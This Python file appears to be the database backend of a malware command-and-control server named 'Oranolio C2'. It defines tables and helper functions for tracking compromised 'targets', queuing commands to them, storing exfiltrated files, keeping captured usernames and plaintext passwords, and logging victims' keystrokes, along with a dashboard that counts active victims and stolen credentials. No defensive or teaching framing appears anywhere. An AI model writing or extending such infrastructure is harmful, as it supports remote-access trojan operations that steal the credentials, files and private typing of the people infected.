#!/usr/bin/env python3
"""
Production-Grade Database Manager for Oranolio C2
Comprehensive schema with connection pooling, migrations, and error handling
"""

import sqlite3
import threading
import queue
import logging
import json
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from contextlib import contextmanager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class DatabaseManager:
    """Production-grade database manager with connection pooling"""
    
    def __init__(self, db_path: str = 'data/oranolio.db', pool_size: int = 5):
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self.pool_size = pool_size
        self.connection_pool = queue.Queue(maxsize=pool_size)
        self.lock = threading.Lock()
        
        # Initialize connection pool
        for _ in range(pool_size):
            conn = self._create_connection()
            self.connection_pool.put(conn)
        
        # Initialize schema
        self.initialize_schema()
        logger.info(f"Database initialized: {self.db_path}")
    
    def _create_connection(self) -> sqlite3.Connection:
        """Create a new database connection"""
        conn = sqlite3.connect(str(self.db_path), check_same_thread=False)
        conn.row_factory = sqlite3.Row
        conn.execute('PRAGMA foreign_keys = ON')
        conn.execute('PRAGMA journal_mode = WAL')
        return conn
    
    @contextmanager
    def get_connection(self):
        """Get a connection from the pool"""
        conn = self.connection_pool.get()
        try:
            yield conn
            conn.commit()
        except Exception as e:
            conn.rollback()
            logger.error(f"Database error: {e}")
            raise
        finally:
            self.connection_pool.put(conn)
    
    def initialize_schema(self):
        """Initialize all database tables"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Users table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT UNIQUE NOT NULL,
                    password_hash TEXT,
                    is_active BOOLEAN DEFAULT 1,
                    is_verified BOOLEAN DEFAULT 1,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_login TIMESTAMP,
                    last_ip TEXT,
                    failed_login_attempts INTEGER DEFAULT 0,
                    locked_until TIMESTAMP
                )
            ''')
            
            # Targets table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id TEXT PRIMARY KEY,
                    hostname TEXT NOT NULL,
                    ip_address TEXT,
                    os_type TEXT,
                    os_version TEXT,
                    username TEXT,
                    computer_name TEXT,
                    mac_address TEXT,
                    status TEXT DEFAULT 'online',
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    metadata TEXT
                )
            ''')
            
            # Commands table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id TEXT,
                    command TEXT NOT NULL,
                    command_type TEXT,
                    status TEXT DEFAULT 'pending',
                    output TEXT,
                    error TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    executed_at TIMESTAMP,
                    completed_at TIMESTAMP,
                    created_by INTEGER,
                    FOREIGN KEY (target_id) REFERENCES targets(id),
                    FOREIGN KEY (created_by) REFERENCES users(id)
                )
            ''')
            
            # Files table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    filename TEXT NOT NULL,
                    original_filename TEXT,
                    file_type TEXT,
                    file_size INTEGER,
                    file_path TEXT,
                    target_id TEXT,
                    uploaded_by INTEGER,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    description TEXT,
                    FOREIGN KEY (target_id) REFERENCES targets(id),
                    FOREIGN KEY (uploaded_by) REFERENCES users(id)
                )
            ''')
            
            # Credentials table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id TEXT,
                    service TEXT,
                    username TEXT,
                    password TEXT,
                    url TEXT,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    metadata TEXT,
                    FOREIGN KEY (target_id) REFERENCES targets(id)
                )
            ''')
            
            # Keylogs table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS keylogs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id TEXT,
                    window_title TEXT,
                    keystrokes TEXT,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (target_id) REFERENCES targets(id)
                )
            ''')
            
            # Audit logs table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS audit_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT NOT NULL,
                    target TEXT,
                    details TEXT,
                    ip_address TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            
            # Sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    expires_at TIMESTAMP,
                    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            
            # Settings table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    category TEXT NOT NULL,
                    key TEXT NOT NULL,
                    value TEXT,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id),
                    UNIQUE(user_id, category, key)
                )
            ''')
            
            # Notifications table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS notifications (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    title TEXT NOT NULL,
                    message TEXT,
                    type TEXT DEFAULT 'info',
                    is_read BOOLEAN DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            
            # Create indexes for performance
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_targets_status ON targets(status)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_target ON commands(target_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_files_target ON files(target_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_credentials_target ON credentials(target_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylogs_target ON keylogs(target_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_audit_user ON audit_logs(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)')
            
            conn.commit()
            logger.info("Database schema initialized successfully")
    
    # ============================================================================
    # USER OPERATIONS
    # ============================================================================
    
    def create_user(self, email: str, password_hash: str = None) -> Optional[int]:
        """Create a new user"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    'INSERT INTO users (email, password_hash) VALUES (?, ?)',
                    (email, password_hash)
                )
                return cursor.lastrowid
        except sqlite3.IntegrityError:
            logger.warning(f"User already exists: {email}")
            return None
        except Exception as e:
            logger.error(f"Error creating user: {e}")
            return None
    
    def get_user_by_email(self, email: str) -> Optional[Dict]:
        """Get user by email"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users WHERE email = ?', (email,))
                row = cursor.fetchone()
                return dict(row) if row else None
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
    
    def update_last_login(self, user_id: int, ip_address: str):
        """Update user's last login"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    'UPDATE users SET last_login = ?, last_ip = ?, failed_login_attempts = 0 WHERE id = ?',
                    (datetime.now(), ip_address, user_id)
                )
        except Exception as e:
            logger.error(f"Error updating last login: {e}")
    
    # ============================================================================
    # TARGET OPERATIONS
    # ============================================================================
    
    def add_target(self, target_id: str, hostname: str, **kwargs) -> bool:
        """Add or update a target"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO targets (id, hostname, ip_address, os_type, os_version, 
                                       username, computer_name, mac_address, metadata)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ON CONFLICT(id) DO UPDATE SET
                        last_seen = CURRENT_TIMESTAMP,
                        status = 'online',
                        ip_address = excluded.ip_address,
                        os_type = excluded.os_type,
                        os_version = excluded.os_version,
                        username = excluded.username,
                        computer_name = excluded.computer_name,
                        mac_address = excluded.mac_address,
                        metadata = excluded.metadata
                ''', (
                    target_id, hostname,
                    kwargs.get('ip_address'),
                    kwargs.get('os_type'),
                    kwargs.get('os_version'),
                    kwargs.get('username'),
                    kwargs.get('computer_name'),
                    kwargs.get('mac_address'),
                    json.dumps(kwargs.get('metadata', {}))
                ))
                return True
        except Exception as e:
            logger.error(f"Error adding target: {e}")
            return False
    
    def get_targets(self, status: str = None, limit: int = 100, offset: int = 0) -> List[Dict]:
        """Get all targets with optional filtering"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if status:
                    cursor.execute(
                        'SELECT * FROM targets WHERE status = ? ORDER BY last_seen DESC LIMIT ? OFFSET ?',
                        (status, limit, offset)
                    )
                else:
                    cursor.execute(
                        'SELECT * FROM targets ORDER BY last_seen DESC LIMIT ? OFFSET ?',
                        (limit, offset)
                    )
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting targets: {e}")
            return []
    
    def get_target(self, target_id: str) -> Optional[Dict]:
        """Get a specific target"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM targets WHERE id = ?', (target_id,))
                row = cursor.fetchone()
                return dict(row) if row else None
        except Exception as e:
            logger.error(f"Error getting target: {e}")
            return None
    
    def update_target_status(self, target_id: str, status: str):
        """Update target status"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    'UPDATE targets SET status = ?, last_seen = ? WHERE id = ?',
                    (status, datetime.now(), target_id)
                )
        except Exception as e:
            logger.error(f"Error updating target status: {e}")
    
    def count_targets(self, status: str = None) -> int:
        """Count targets"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if status:
                    cursor.execute('SELECT COUNT(*) FROM targets WHERE status = ?', (status,))
                else:
                    cursor.execute('SELECT COUNT(*) FROM targets')
                return cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Error counting targets: {e}")
            return 0
    
    # ============================================================================
    # COMMAND OPERATIONS
    # ============================================================================
    
    def create_command(self, target_id: str, command: str, command_type: str, user_id: int) -> Optional[int]:
        """Create a new command"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO commands (target_id, command, command_type, created_by)
                    VALUES (?, ?, ?, ?)
                ''', (target_id, command, command_type, user_id))
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Error creating command: {e}")
            return None
    
    def get_commands(self, target_id: str = None, status: str = None, limit: int = 100) -> List[Dict]:
        """Get commands with optional filtering"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                query = 'SELECT * FROM commands WHERE 1=1'
                params = []
                
                if target_id:
                    query += ' AND target_id = ?'
                    params.append(target_id)
                if status:
                    query += ' AND status = ?'
                    params.append(status)
                
                query += ' ORDER BY created_at DESC LIMIT ?'
                params.append(limit)
                
                cursor.execute(query, params)
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting commands: {e}")
            return []
    
    def update_command_status(self, command_id: int, status: str, output: str = None, error: str = None):
        """Update command status and output"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if status == 'executing':
                    cursor.execute(
                        'UPDATE commands SET status = ?, executed_at = ? WHERE id = ?',
                        (status, datetime.now(), command_id)
                    )
                elif status == 'completed':
                    cursor.execute(
                        'UPDATE commands SET status = ?, output = ?, completed_at = ? WHERE id = ?',
                        (status, output, datetime.now(), command_id)
                    )
                elif status == 'failed':
                    cursor.execute(
                        'UPDATE commands SET status = ?, error = ?, completed_at = ? WHERE id = ?',
                        (status, error, datetime.now(), command_id)
                    )
        except Exception as e:
            logger.error(f"Error updating command status: {e}")
    
    # ============================================================================
    # FILE OPERATIONS
    # ============================================================================
    
    def add_file(self, filename: str, original_filename: str, file_type: str, 
                 file_size: int, file_path: str, target_id: str = None, 
                 user_id: int = None, description: str = None) -> Optional[int]:
        """Add a file record"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO files (filename, original_filename, file_type, file_size, 
                                     file_path, target_id, uploaded_by, description)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (filename, original_filename, file_type, file_size, file_path, 
                      target_id, user_id, description))
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Error adding file: {e}")
            return None
    
    def get_files(self, target_id: str = None, file_type: str = None, limit: int = 100) -> List[Dict]:
        """Get files with optional filtering"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                query = 'SELECT * FROM files WHERE 1=1'
                params = []
                
                if target_id:
                    query += ' AND target_id = ?'
                    params.append(target_id)
                if file_type:
                    query += ' AND file_type = ?'
                    params.append(file_type)
                
                query += ' ORDER BY uploaded_at DESC LIMIT ?'
                params.append(limit)
                
                cursor.execute(query, params)
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting files: {e}")
            return []
    
    def delete_file(self, file_id: int) -> bool:
        """Delete a file record"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM files WHERE id = ?', (file_id,))
                return True
        except Exception as e:
            logger.error(f"Error deleting file: {e}")
            return False
    
    # ============================================================================
    # CREDENTIALS OPERATIONS
    # ============================================================================
    
    def add_credential(self, target_id: str, service: str, username: str, 
                      password: str, url: str = None, metadata: Dict = None) -> Optional[int]:
        """Add a captured credential"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO credentials (target_id, service, username, password, url, metadata)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (target_id, service, username, password, url, json.dumps(metadata or {})))
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Error adding credential: {e}")
            return None
    
    def get_credentials(self, target_id: str = None, limit: int = 100) -> List[Dict]:
        """Get credentials with optional filtering"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if target_id:
                    cursor.execute(
                        'SELECT * FROM credentials WHERE target_id = ? ORDER BY captured_at DESC LIMIT ?',
                        (target_id, limit)
                    )
                else:
                    cursor.execute(
                        'SELECT * FROM credentials ORDER BY captured_at DESC LIMIT ?',
                        (limit,)
                    )
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting credentials: {e}")
            return []
    
    # ============================================================================
    # KEYLOG OPERATIONS
    # ============================================================================
    
    def add_keylog(self, target_id: str, window_title: str, keystrokes: str) -> Optional[int]:
        """Add a keylog entry"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO keylogs (target_id, window_title, keystrokes)
                    VALUES (?, ?, ?)
                ''', (target_id, window_title, keystrokes))
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Error adding keylog: {e}")
            return None
    
    def get_keylogs(self, target_id: str = None, limit: int = 100) -> List[Dict]:
        """Get keylogs with optional filtering"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if target_id:
                    cursor.execute(
                        'SELECT * FROM keylogs WHERE target_id = ? ORDER BY captured_at DESC LIMIT ?',
                        (target_id, limit)
                    )
                else:
                    cursor.execute(
                        'SELECT * FROM keylogs ORDER BY captured_at DESC LIMIT ?',
                        (limit,)
                    )
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting keylogs: {e}")
            return []
    
    # ============================================================================
    # AUDIT LOG OPERATIONS
    # ============================================================================
    
    def add_audit_log(self, user_id: int, action: str, target: str = None, 
                     details: str = None, ip_address: str = None):
        """Add an audit log entry"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO audit_logs (user_id, action, target, details, ip_address)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user_id, action, target, details, ip_address))
        except Exception as e:
            logger.error(f"Error adding audit log: {e}")
    
    def get_audit_logs(self, user_id: int = None, limit: int = 100) -> List[Dict]:
        """Get audit logs"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if user_id:
                    cursor.execute(
                        'SELECT * FROM audit_logs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?',
                        (user_id, limit)
                    )
                else:
                    cursor.execute(
                        'SELECT * FROM audit_logs ORDER BY created_at DESC LIMIT ?',
                        (limit,)
                    )
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting audit logs: {e}")
            return []
    
    # ============================================================================
    # STATISTICS
    # ============================================================================
    
    def get_dashboard_stats(self) -> Dict:
        """Get dashboard statistics"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                # Active targets
                cursor.execute("SELECT COUNT(*) FROM targets WHERE status = 'online'")
                active_targets = cursor.fetchone()[0]
                
                # Total targets
                cursor.execute("SELECT COUNT(*) FROM targets")
                total_targets = cursor.fetchone()[0]
                
                # Commands today
                cursor.execute("""
                    SELECT COUNT(*) FROM commands 
                    WHERE DATE(created_at) = DATE('now')
                """)
                commands_today = cursor.fetchone()[0]
                
                # Total commands
                cursor.execute("SELECT COUNT(*) FROM commands")
                total_commands = cursor.fetchone()[0]
                
                # Total credentials
                cursor.execute("SELECT COUNT(*) FROM credentials")
                total_credentials = cursor.fetchone()[0]
                
                # Total keylogs
                cursor.execute("SELECT COUNT(*) FROM keylogs")
                total_keylogs = cursor.fetchone()[0]
                
                # Success rate
                cursor.execute("""
                    SELECT 
                        COUNT(CASE WHEN status = 'completed' THEN 1 END) * 100.0 / COUNT(*) 
                    FROM commands 
                    WHERE status IN ('completed', 'failed')
                """)
                result = cursor.fetchone()[0]
                success_rate = round(result if result else 0, 1)
                
                return {
                    'active_targets': active_targets,
                    'total_targets': total_targets,
                    'commands_today': commands_today,
                    'total_commands': total_commands,
                    'total_credentials': total_credentials,
                    'total_keylogs': total_keylogs,
                    'success_rate': success_rate
                }
        except Exception as e:
            logger.error(f"Error getting dashboard stats: {e}")
            return {}
    
    def cleanup_old_data(self, days: int = 30):
        """Clean up old data"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cutoff_date = datetime.now() - timedelta(days=days)
                
                # Clean old commands
                cursor.execute(
                    "DELETE FROM commands WHERE created_at < ? AND status IN ('completed', 'failed')",
                    (cutoff_date,)
                )
                
                # Clean old audit logs
                cursor.execute(
                    "DELETE FROM audit_logs WHERE created_at < ?",
                    (cutoff_date,)
                )
                
                logger.info(f"Cleaned up data older than {days} days")
        except Exception as e:
            logger.error(f"Error cleaning up old data: {e}")

# Global database instance
db = DatabaseManager()

if __name__ == '__main__':
    print("=" * 60)
    print("PRODUCTION DATABASE MANAGER")
    print("=" * 60)
    print("\nDatabase initialized successfully!")
    print(f"Location: {db.db_path}")
    print(f"Connection pool size: {db.pool_size}")
    print("\nTables created:")
    print("  ✓ users")
    print("  ✓ targets")
    print("  ✓ commands")
    print("  ✓ files")
    print("  ✓ credentials")
    print("  ✓ keylogs")
    print("  ✓ audit_logs")
    print("  ✓ sessions")
    print("  ✓ settings")
    print("  ✓ notifications")
    print("\nFeatures:")
    print("  ✓ Connection pooling")
    print("  ✓ Foreign key constraints")
    print("  ✓ WAL mode for performance")
    print("  ✓ Comprehensive indexes")
    print("  ✓ Error handling")
    print("  ✓ Audit logging")
    print("=" * 60)
